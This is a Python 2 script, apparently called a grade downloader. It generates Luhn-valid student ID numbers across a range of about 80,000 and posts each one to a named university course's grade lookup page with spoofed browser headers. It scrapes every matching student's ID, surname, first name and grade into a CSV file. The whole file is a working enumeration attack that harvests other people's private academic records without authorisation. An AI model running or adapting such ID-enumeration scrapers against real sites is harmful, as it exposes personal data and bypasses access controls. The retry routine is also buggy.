import requests
import re
import os
import platform
import time

#generators for luhn checksum
def checksum(string):
    digits=list(map(int, string))
    odd_sum=sum(digits[-1::-2])
    even_sum=sum([sum(divmod(2 * d, 10)) for d in digits[-2::-2]])
    return (odd_sum + even_sum) % 10

def generate(string):
    cksum=checksum(string + '0')
    return (10 - cksum) % 10

def luhn(iterator):
    sit=str(iterator)
    id=sit+str(generate(sit))
    return int(id)

#regex search pattern
pattern='<tr><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td>'

#headers for requests
headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3',
    'Referer': 'http://ma219.math.metu.edu.tr/SIS/sis.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}


if platform.system() == 'Linux':
    os.system("clear")
else :
    os.system("cls")

print "Welcome to MATH219 Grade Downloader!"

#open the file to write
#written file format: id,lastname,firstname,grade
try:
    f=open("219.csv", "a")
except:
    print "I cannot open 219.csv, please check permissions, OR I'LL DIE LIKE RIGHT NOW"
    exit()

def requestIt(headers,data):
    try:
        response=requests.post('http://ma219.math.metu.edu.tr/SIS/sis.php', headers=headers, data=data)
        return response
    except:
        time.sleep(5000)
        print "Let's sleep a bit, baba yorgun"
        requestIt(headers,data)


for i in xrange(170000,250000):
    data={
      'id': luhn(i),
      'Submit': 'Show Info'
    }
    if not i % 100:
        print "Started new section: ", i

    response=requestIt(headers,data)

    temp=re.findall(pattern, response.content)
    if(len(temp) > 1):
        temp=temp[1]
        print temp[0], "-", temp[2], temp[1], "imported"
        f.write(temp[0]+","+temp[1]+","+temp[2]+","+temp[10]+"\n")

print "That's all folks!"
